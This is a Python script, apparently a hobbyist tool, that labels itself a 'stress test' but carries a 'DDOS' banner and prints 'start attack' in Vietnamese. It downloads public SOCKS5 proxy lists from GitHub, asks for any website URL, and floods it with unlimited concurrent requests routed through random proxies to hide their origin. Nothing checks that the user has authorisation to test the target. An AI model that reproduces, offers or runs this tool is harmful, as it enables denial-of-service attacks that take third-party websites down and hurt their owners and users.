#!/usr/bin/env python3
"""
STRESS TEST ULTIMATE - Lấy Proxy Từ Nhiều Link
"""

import asyncio
import aiohttp
import aiohttp_socks
import random
import time
import os
import sys
from datetime import datetime

# ====================== CẤU HÌNH ======================
PROXY_URLS = [
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
]

CONCURRENCY = 900
MIN_DELAY = 0.01
MAX_DELAY = 0.06
# =====================================================

def show_banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner = r"""
██████╗░███╗░░██╗███╗░░░███╗
██╔══██╗████╗░██║████╗░████║
██████╔╝██╔██╗██║██╔████╔██║
██╔═══╝░██║╚████║██║╚██╔╝██║
██║░░░░░██║░╚███║██║░╚═╝░██║
╚═╝░░░░░╚═╝░░╚══╝╚═╝░░░░░╚═╝

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░
                                            By Nhatminhdzzz
    """
    print("\033[96m" + banner + "\033[0m")

async def load_proxies_from_url(url, session):
    try:
        async with session.get(url, timeout=15) as resp:
            if resp.status == 200:
                text = await resp.text()
                proxies = ['socks5://' + line.strip() for line in text.splitlines() 
                          if line.strip() and not line.startswith('#')]
                return proxies
    except:
        pass
    return []

async def load_all_proxies():
    print("\033[96m[*] Đang tải proxy từ nhiều nguồn...\033[0m")
    all_proxies = []
    
    async with aiohttp.ClientSession() as session:
        tasks = [load_proxies_from_url(url, session) for url in PROXY_URLS]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, list):
                all_proxies.extend(result)
    
    # Loại trùng và lọc
    unique_proxies = list(set(all_proxies))
    print(f"\033[92m[+] Tổng proxy thu thập: {len(unique_proxies)}\033[0m")
    return unique_proxies

async def send_request(session, url, req_id, proxy):
    delay = random.uniform(MIN_DELAY, MAX_DELAY)
    await asyncio.sleep(delay)

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    
    try:
        async with session.get(url, headers=headers, proxy=proxy, timeout=10) as resp:
            await resp.read()
            print(f"\033[92m[{req_id:6d}] ✅ {resp.status}\033[0m")
            return 1
    except:
        print(f"\033[91m[{req_id:6d}] ❌ ERROR\033[0m")
        return 0

async def main():
    show_banner()

    url = input("\033[96mNhập URL website: \033[0m").strip()
    if not url.startswith("http"):
        url = "https://" + url

    total = int(input("\033[96mTổng request (0 = vô hạn): \033[0m") or "0")
    concurrency = int(input("\033[96mConcurrency (khuyến nghị 800-1200): \033[0m") or "900")

    proxies = await load_all_proxies()
    if not proxies:
        print("\033[91mKhông có proxy nào!\033[0m")
        return

    print(f"\n\033[95m🚀 BẮT ĐẦU TẤN CÔNG {url} | Concurrency: {concurrency}\033[0m\n")

    start_time = time.time()
    success = 0
    connector = aiohttp_socks.ProxyConnector.from_url(random.choice(proxies))

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        i = 0

        while (total == 0 or i < total):
            i += 1
            task = asyncio.create_task(send_request(session, url, i, random.choice(proxies)))
            tasks.append(task)

            if len(tasks) >= concurrency:
                done, _ = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                success += sum(1 for t in done if t.result() == 1)
                tasks = [t for t in tasks if not t.done()]

    duration = time.time() - start_time
    print("\n" + "="*70)
    print("                    KẾT QUẢ")
    print("="*70)
    print(f"Tổng request : {i}")
    print(f"Thành công   : {success}")
    print(f"Thời gian    : {duration:.2f} giây")
    print(f"Tốc độ       : {i/duration:.2f} req/s")
    print("="*70)

if __name__ == "__main__":
    asyncio.run(main())
